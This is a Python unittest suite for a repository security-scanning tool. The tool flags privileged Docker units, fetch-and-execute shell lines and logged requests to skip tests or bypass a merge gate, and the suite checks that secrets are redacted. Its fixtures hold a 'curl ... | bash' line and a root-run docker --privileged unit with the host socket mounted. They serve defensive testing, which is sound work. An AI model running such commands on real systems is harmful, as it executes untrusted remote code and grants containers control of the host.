from __future__ import annotations

import json
import tempfile
import unittest
from contextlib import redirect_stdout
from datetime import datetime, timedelta, timezone
from io import StringIO
from pathlib import Path
from unittest import mock

from tools.security_sentinel import sentinel


NOW = datetime(2026, 6, 17, 12, tzinfo=timezone.utc)


class SecuritySentinelTest(unittest.TestCase):
    def make_repo(self) -> Path:
        root = Path(tempfile.mkdtemp())
        for rel in ("tools/build_loop", "core/BUILD/cron", "core/BUILD/systemd", "SERVICES/api", "scripts"):
            (root / rel).mkdir(parents=True, exist_ok=True)
        (root / "core/BUILD/REGISTRY.json").write_text(
            json.dumps({
                "updated_at": NOW.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "active_builds": [{
                    "id": "SPEC_ok",
                    "branch": "build/SPEC_ok",
                    "base_branch": "feat/headless-build",
                    "status": "done",
                    "tests_passed": True,
                }],
            }),
            encoding="utf-8",
        )
        return root

    def run_sentinel(self, root: Path, *, ledger: Path | None = None, no_ledger: bool = True) -> dict:
        return sentinel.run(
            repo_root=root,
            json_path=root / "security.json",
            markdown_path=root / "security.md",
            ops_ledger=ledger or root / "ops.jsonl",
            disable_file=root / ".disabled",
            cooldown_file=root / ".cooldown",
            now=NOW,
            no_ledger=no_ledger,
        )

    def test_detects_privileged_hardware_access_and_fetch_exec(self) -> None:
        root = self.make_repo()
        (root / "core/BUILD/cron/fpai-risk.service").write_text(
            "[Service]\nUser=root\nExecStart=/usr/bin/docker run --privileged -v /var/run/docker.sock:/var/run/docker.sock image\n",
            encoding="utf-8",
        )
        (root / "scripts/install.sh").write_text("curl https://example.invalid/install.sh | bash\n", encoding="utf-8")

        report = self.run_sentinel(root)

        titles = {finding["title"] for finding in report["findings"]}
        self.assertIn("Privileged host or hardware access appears in runnable artifacts", titles)
        self.assertIn("Shell-fetch execution patterns are present", titles)
        self.assertGreaterEqual(report["summary"]["by_category"]["hardware"], 1)
        self.assertTrue((root / "security.json").exists())
        self.assertIn("Security Sentinel Report", (root / "security.md").read_text(encoding="utf-8"))

    def test_skips_obvious_secret_bearing_files(self) -> None:
        root = self.make_repo()
        (root / "scripts/.env").write_text("PASSWORD='skip tests and bypass review'\n", encoding="utf-8")
        (root / "SERVICES/api/private_key.pem").write_text("User=root\n", encoding="utf-8")

        report = self.run_sentinel(root)

        evidence = json.dumps([finding["evidence"] for finding in report["findings"]])
        self.assertNotIn("PASSWORD", evidence)
        self.assertNotIn("private_key.pem", evidence)

    def test_detects_recent_circumvention_attempt_in_ops_ledger(self) -> None:
        root = self.make_repo()
        ledger = root / "ops.jsonl"
        ledger.write_text(
            json.dumps({
                "ts": (NOW - timedelta(hours=2)).strftime("%Y-%m-%dT%H:%M:%SZ"),
                "loop": "manual",
                "event": "attempted",
                "detail": "please skip tests and bypass the merge gate with bearer abcdefghijklmnopqrstuvwxyz0123456789 at https://private.invalid/path",
                "token": "SECRET-SHAPE",
            }) + "\n",
            encoding="utf-8",
        )

        report = self.run_sentinel(root, ledger=ledger)

        finding = next(item for item in report["findings"] if item["category"] == "adversarial_behavior")
        self.assertIn("circumvention attempts", finding["title"])
        evidence = json.dumps(finding["evidence"])
        self.assertIn("skip tests", evidence)
        self.assertIn("[long-token]", evidence)
        self.assertIn("[url]", evidence)
        self.assertNotIn("SECRET-SHAPE", evidence)
        self.assertNotIn("private.invalid", evidence)

    def test_registry_contract_violations_are_p0(self) -> None:
        root = self.make_repo()
        (root / "core/BUILD/REGISTRY.json").write_text(
            json.dumps({
                "updated_at": NOW.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "active_builds": [
                    {"id": "bad_done", "status": "done", "tests_passed": False, "branch": "build/bad", "base_branch": "feat/headless-build"},
                    {"id": "main_build", "status": "building", "tests_passed": False, "branch": "main", "base_branch": "main"},
                ],
            }),
            encoding="utf-8",
        )

        report = self.run_sentinel(root)

        self.assertEqual(report["summary"]["p0"], 2)
        titles = {finding["title"] for finding in report["findings"]}
        self.assertIn("Registry has done builds without passing tests", titles)
        self.assertIn("Registry references main/master for build work", titles)

    def test_disabled_run_does_not_write_report_or_ledger(self) -> None:
        root = self.make_repo()
        (root / ".disabled").write_text("off", encoding="utf-8")

        report = sentinel.run(
            repo_root=root,
            json_path=root / "security.json",
            markdown_path=root / "security.md",
            ops_ledger=root / "ops.jsonl",
            disable_file=root / ".disabled",
            cooldown_file=root / ".cooldown",
            now=NOW,
        )

        self.assertTrue(report["disabled"])
        self.assertFalse((root / "security.json").exists())
        self.assertFalse((root / "security.md").exists())
        self.assertFalse((root / "ops.jsonl").exists())

    def test_ledger_row_written_for_normal_run(self) -> None:
        root = self.make_repo()

        report = self.run_sentinel(root, no_ledger=False)

        self.assertTrue(report["ledger_written"])
        rows = [json.loads(line) for line in (root / "ops.jsonl").read_text(encoding="utf-8").splitlines()]
        self.assertEqual(rows[-1]["loop"], "security_sentinel")
        self.assertIn(rows[-1]["event"], {"ran", "proposed", "failed"})

    def test_send_alert_requires_actual_sent_output(self) -> None:
        root = self.make_repo()
        (root / "tools/build_loop/notify_telegram.sh").write_text("#!/bin/sh\n", encoding="utf-8")
        skipped = mock.Mock(returncode=0, stdout="notify: no creds at /x (skipped)", stderr="")
        sent = mock.Mock(returncode=0, stdout="notify: sent to 123", stderr="")

        with mock.patch("tools.security_sentinel.sentinel.subprocess.run", return_value=skipped):
            self.assertFalse(sentinel.send_alert(root, "hello"))
        with mock.patch("tools.security_sentinel.sentinel.subprocess.run", return_value=sent):
            self.assertTrue(sentinel.send_alert(root, "hello"))

    def test_cooldown_blocks_repeated_alerts(self) -> None:
        root = self.make_repo()
        report = {"summary": {"max_severity": 4}}
        cooldown = root / ".cooldown"

        self.assertTrue(sentinel.should_alert(report, cooldown, NOW))
        cooldown.write_text((NOW - timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%SZ"), encoding="utf-8")
        self.assertFalse(sentinel.should_alert(report, cooldown, NOW))

    def test_alert_message_uses_overridden_report_path(self) -> None:
        report = {
            "summary": {"total_findings": 1, "max_severity": 4, "p0": 0, "p1": 1},
            "findings": [{"title": "Custom path proof"}],
        }

        message = sentinel.alert_message(report, Path("/tmp/custom-security.md"))

        self.assertIn("/tmp/custom-security.md", message)
        self.assertNotIn(str(sentinel.DEFAULT_MD), message)

    def test_cli_returns_zero_even_when_p0_is_reported(self) -> None:
        root = self.make_repo()
        (root / "core/BUILD/REGISTRY.json").write_text(
            json.dumps({"active_builds": [{"id": "bad", "status": "done", "tests_passed": False}]}),
            encoding="utf-8",
        )

        with redirect_stdout(StringIO()):
            code = sentinel.main([
                "--repo-root", str(root),
                "--json", str(root / "security.json"),
                "--markdown", str(root / "security.md"),
                "--ops-ledger", str(root / "ops.jsonl"),
                "--disable-file", str(root / ".disabled"),
                "--cooldown-file", str(root / ".cooldown"),
                "--no-ledger",
            ])

        self.assertEqual(code, 0)
        report = json.loads((root / "security.json").read_text(encoding="utf-8"))
        self.assertEqual(report["summary"]["p0"], 1)


if __name__ == "__main__":
    unittest.main()
